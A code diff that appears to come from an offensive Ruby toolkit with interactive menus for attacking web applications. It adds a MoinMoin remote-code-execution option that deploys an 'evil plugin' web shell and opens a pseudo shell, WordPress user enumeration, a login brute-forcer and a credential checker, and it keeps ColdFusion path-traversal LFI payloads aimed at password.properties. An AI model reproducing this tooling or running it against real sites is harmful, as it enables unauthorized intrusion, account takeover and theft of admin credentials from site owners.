@@ -8,6 +8,7 @@ def special_usage
   puts "Available Options for Specialty Tools Menu: ".underline.white
   puts "back ".light_yellow + "      => ".white + "Return to Main Menu".light_red
   puts "coldfusion".light_yellow + " => ".white + "Coldfusion Tools".light_red
+  puts "moinmoin".light_yellow + "   => ".white + "MoinMoin RCE".light_red
   puts "phpcgi".light_yellow + "     => ".white + "PHP CGI RCE Tools".light_red
   puts "phpBB".light_yellow + "      => ".white + "phpBB Tools".light_red
   puts "ipb".light_yellow + "        => ".white + "IPB Tools".light_red
@@ -80,6 +81,9 @@ def special_menu
     when /^ipb$|Invision PowerBoard|^i.p.b.$/i
       ipb_menu
       special_menu
+    when /^moinmoin$|^moin$|^moin.moin/i
+      moinmoin_menu
+      special_menu
     else
       puts
       print_error("Oops, Didn't quite understand that one!")
@@ -94,9 +98,15 @@ def wp_usage
   puts "Available Options for WordPress Menu: ".underline.white
   puts "back ".light_yellow + "      => ".white + "Return to Main Menu".light_red
   puts "version".light_yellow + "    => ".white + "WordPress Version Checker".light_red
+  puts "users".light_yellow + "      => ".white + "WordPress Users Enumerator".light_red
   puts "themes".light_yellow + "     => ".white + "WordPress Themes Enumerator".light_red
   puts "plugins".light_yellow + "    => ".white + "WordPress Plugins Enumerator".light_red
-  puts "enumerator".light_yellow + " => ".white + "WordPress Enumerator Tool".light_red
+  puts "fthemes".light_yellow + "    => ".white + "WordPress Forceful Themes Enumerator".light_red
+  puts "fplugins".light_yellow + "   => ".white + "WordPress Forceful Plugins Enumerator".light_red
+  puts "backups".light_yellow + "    => ".white + "WordPress Backup Config Enumerator".light_red
+  puts "enumerator".light_yellow + " => ".white + "WordPress Enumerator Tool (Runs Everything)".light_red
+  puts "cred_check".light_yellow + " => ".white + "WordPress Login Credentials Checker".light_red
+  puts "wp_login".light_yellow + "   => ".white + "WordPress Login Bruteforcer".light_red
 end
 
 # IPB Forums
@@ -155,14 +165,35 @@ def wp_menu
         print_error("Unable to determine WordPress version for #{target.strip.chomp}.....")
       end
       wp_menu
-    when /^plugins$/
+    when /^plugin/i
       target = Readline.readline("   Enter Target URL: ", true)
       puts
       print_status("Trying to Enumerate WordPress Plugins....")
       wp = WordPressAudit.new(target.strip.chomp)
       plugins = wp.wp_plugin_enumerator
       if plugins.nil?
-        print_error("Unable to enumerate WordPress plugins.....")
+        print_error("Sorry, Unable to identify any known WordPress plugins.....")
+      end
+      wp_menu
+    when /^fplugin/i
+      target = Readline.readline("   Enter Target URL: ", true)
+      answer = Readline.readline("   Use default plugins fuzz file (Y/N)?", true)
+      if answer[0].upcase == 'N'
+        custom=true
+        while(true)
+          plist = Readline.readline("   Plugins Fuzz File to Use: ", true)
+          break if File.exists?(plist.strip.chomp)
+          print_error("Problem loading #{plist.strip.chomp}!")
+          print_error("Check path or permissions and try again....\n\n")
+        end
+      end
+      puts
+      print_status("Trying Forceful Enumeration of WordPress Plugins....")
+      wp = WordPressAudit.new(target.strip.chomp)
+      plugins = wp.wp_plugin_forceful_enumerator if not custom
+      plugins = wp.wp_plugin_forceful_enumerator(plist.strip.chomp) if custom
+      if plugins.nil?
+        print_error("Unable to identify any known WordPress plugins.....")
       end
       wp_menu
     when /^theme/i
@@ -175,11 +206,48 @@ def wp_menu
         print_error("Unable to enumerate WordPress themes.....")
       end
       wp_menu
+    when /^ftheme/i
+      target = Readline.readline("   Enter Target URL: ", true)
+      answer = Readline.readline("   Use default themes fuzz file (Y/N)?", true)
+      if answer[0].upcase == 'N'
+        custom=true
+        while(true)
+          tlist = Readline.readline("   Themes Fuzz File to Use: ", true)
+          break if File.exists?(tlist.strip.chomp)
+          print_error("Problem loading #{tlist.strip.chomp}!")
+          print_error("Check path or permissions and try again....\n\n")
+        end
+      end
+      puts
+      print_status("Trying Forceful Enumeration of WordPress Themes....")
+      wp = WordPressAudit.new(target.strip.chomp)
+      themes = wp.wp_theme_forceful_enumerator if not custom
+      themes = wp.wp_theme_forceful_enumerator(tlist.strip.chomp) if custom
+      if themes.nil?
+        print_error("Unable to identify any known WordPress themes.....")
+      end
+      wp_menu
+    when /^user/i
+      target = Readline.readline("   Enter Target URL: ", true)
+      puts
+      print_status("Checking for WordPress usernames....")
+      wp = WordPressAudit.new(target.strip.chomp)
+      users = wp.wp_users_check
+      if users.nil?
+        print_error("No Users Found!")
+      end
+      wp_menu
+    when /^backups/i
+      target = Readline.readline("   Enter Target URL: ", true)
+      puts
+      print_status("Checking for common config backups....")
+      wp = WordPressAudit.new(target.strip.chomp)
+      wp.wp_backup_configs_check
+      wp_menu
     when /^enum$|^enumerat/i
       target = Readline.readline("   Enter Target URL: ", true)
       puts
       print_status("Running WordPress Enumeration....")
-      print_status("Checking for version info....")
       wp = WordPressAudit.new(target.strip.chomp)
       a = wp.wp_generator_version_check
       b = wp.wp_install_version_check
@@ -187,18 +255,79 @@ def wp_menu
       if a.nil? and b.nil? and c.nil?
         print_error("Unable to determine WordPress version for #{target.strip.chomp}.....")
       end
+      fpd_path = wp.wp_rss_fpd
+      print_good("Full Path Disclosure: #{target.strip.chomp.sub(/\/$/, '')}/rss-functions.php") unless fpd_path.nil?
+      print_line("   #{fpd_path}") unless fpd_path.nil?
+      print_error("/rss-functions.php FPD Not Found...") if fpd_path.nil?
+      wp.wp_xmlrpc_check
       puts
       print_status("Trying to Enumerate Plugins....")
       plugins = wp.wp_plugin_enumerator
       if plugins.nil?
-        print_error("Unable to Enumerate Plugins.....")
+        print_error("Plugin Directory is not Indexed")
+        print_status("Going to try forceful enumeration...")
+        plugins = wp.wp_plugin_forceful_enumerator
+        if plugins.nil?
+          print_error("Unable to identify any known WordPress plugins!")
+        end
       end
       puts
       print_status("Trying to Enumerate Themes....")
       themes = wp.wp_theme_enumerator
       if themes.nil?
-        print_error("Unable to Enumerate Themes.....")
+        print_error("Themes Directory is not Indexed")
+        themes = wp.wp_theme_forceful_enumerator
+        print_error("Unable to identify WordPress theme!") if themes.nil?
       end
+      puts
+      print_status("Checking for config backups....")
+      wp.wp_backup_configs_check
+      puts
+      print_status("Checking for WordPress usernames....")
+      users = wp.wp_users_check
+      if users.nil?
+        print_error("No Users Found!")
+      end
+      wp_menu
+    when /^cred.check|^credential|^creds$|^credz$/i
+      target = Readline.readline("   Enter Target URL: ", true)
+      answer = Readline.readline("   Use default path (Y/N)?", true)
+      if answer[0].upcase == 'N'
+        while(true)
+          response = Readline.readline("   Path to WP Login Page: ", true)
+          path = response.strip.chomp
+        end
+      else
+        path=nil
+      end
+      username = Readline.readline("   Enter WP Username: ", true)
+      password = Readline.readline("   Enter #{username.strip.chomp}'s Password: ", true)
+      puts
+      print_status("Checking credentials....")
+      wp = WordPressAudit.new(target.strip.chomp)
+      wp.wp_login_check(username.strip.chomp, password.strip.chomp, path)
+      wp_menu
+    when /^wp.login|^login$|^brute|^wp.brute/i
+      target = Readline.readline("   Enter Target URL: ", true)
+      answer = Readline.readline("   Use default path (Y/N)?", true)
+      if answer[0].upcase == 'N'
+        while(true)
+          response = Readline.readline("   Path to WP Login Page: ", true)
+          path = response.strip.chomp
+        end
+      else
+        path=nil
+      end
+      username = Readline.readline("   Enter WP Username: ", true)
+      while(true)
+        wordlist = Readline.readline("   Path to Wordlist: ", true)
+        break if File.exists?(wordlist.strip.chomp)
+        print_error("Problem loading #{wordlist.strip.chomp}!")
+        print_error("Check path or permissions and try again....\n\n")
+      end
+      puts
+      wp = WordPressAudit.new(target.strip.chomp)
+      wp.wp_login_bruter2(username.strip.chomp, wordlist.strip.chomp, path)
       wp_menu
     else
       puts
@@ -957,8 +1086,8 @@ def coldfusion_menu(target=nil)
         end
       when 8
         print_status("Trying to trigger Locale LFI......")
-        if not old_lfi('locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en')
-          if not old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
+        if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en')
+          if not cf.old_lfi('locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en')
             print_error("Locale LFI Not Working! :(\n")
             print_status("Checking for XEE Injection.....")
             cf.xee
@@ -1039,3 +1168,93 @@ def coldfusion_menu(target=nil)
   end
 end
 
+# MoinMoin Help Menu
+def moinmoin_usage
+  puts "Available Options for MoinMoin Menu: ".underline.white
+  puts "back ".light_yellow + "     => ".white + "Return to Main Menu".light_red
+  puts "exploit".light_yellow + "   => ".white + "MoinMoin RCE Exploit".light_red
+end
+
+# MoinMoin Wiki
+def moinmoin_menu
+  puts
+  prompt = "(mo1n)> "
+  while line = Readline.readline("#{prompt}", true)
+    cmd = line.chomp
+    case cmd
+    when /^c$|^clear$|^cls$/i
+      cls
+      banner
+      moinmoin_menu
+    when /^h$|^help$|^ls$/i
+      puts
+      moinmoin_usage
+      moinmoin_menu
+    when /^exit$|^quit$|^back$/i
+      puts
+      print_error("Returning to previous menu....")
+      special_menu
+    when /^!(.+)/
+      cmd=$1.strip.chomp
+      res = commandz(cmd)
+      print_line("\n#{res.join().chomp}")
+      moinmoin_menu
+    when /^local$|^OS$/i
+      local_shell
+      moinmoin_menu
+    when /^config$/i
+      print_status("Current Configuration: ")
+      pp $config
+      moinmoin_menu
+    when /^ip$/i
+      ip_info
+      moinmoin_menu
+    when /^ip2host$|^host2ip$/i
+      host = Readline.readline("   Target IP or Domain: ", true)
+      dnsenum = DNSEnum.new(host.strip.chomp)
+      ip, domain, hostname = dnsenum.host_info
+      puts
+      print_status("IP: #{ip}")
+      print_status("Domain: #{domain}") unless domain == ip
+      print_status("Hostname: #{hostname}\n\n")
+      moinmoin_menu
+    when /^exploit$/i
+      target = Readline.readline("   Enter Target IP: ", true)
+      answer = Readline.readline("   Custom Path Prefix Needed (Y/N)?: ", true)
+      if answer[0].upcase == 'Y'
+        p = Readline.readline("   Enter Path Prefix: ", true)
+        path_prefix = p.strip.chomp.sub(/\/$/, '') + '/'
+      else
+        path_prefix = ''
+      end
+      puts
+      print_status("Checking for MoinMoin RCE Vuln...")
+      moin=MoinMoin.new(target.strip.chomp, path_prefix)
+      if moin.get_ticket
+        print_good("Obtained valid ticket!")
+        print_status("Trying to create new plugin....")
+        param = moin.deploy_evil_plugin
+        if not param.nil?
+          print_good("Plugin Deployed!")
+          print_status("Dropping to Pseudo Shell now...")
+          moin.pseudo_shell
+          print_good("Shell Location: http://#{target.strip.chomp}/#{path_prefix}moin/WikiSandBox?action=moinexec&#{param}=_COMMAND_")
+        else
+          puts
+          print_error("Problem deploying evil plugin!")
+          print_error("Can't continue as a result....\n")
+        end
+      else
+        puts
+        print_error("Unable to obtain a valid ticket!")
+        print_error("Can't continue as a result....\n")
+      end
+      moinmoin_menu
+    else
+      puts
+      print_error("Oops, Didn't quite understand that one!")
+      print_error("Please try again...\n\n")
+      ipb_menu
+    end
+  end
+end
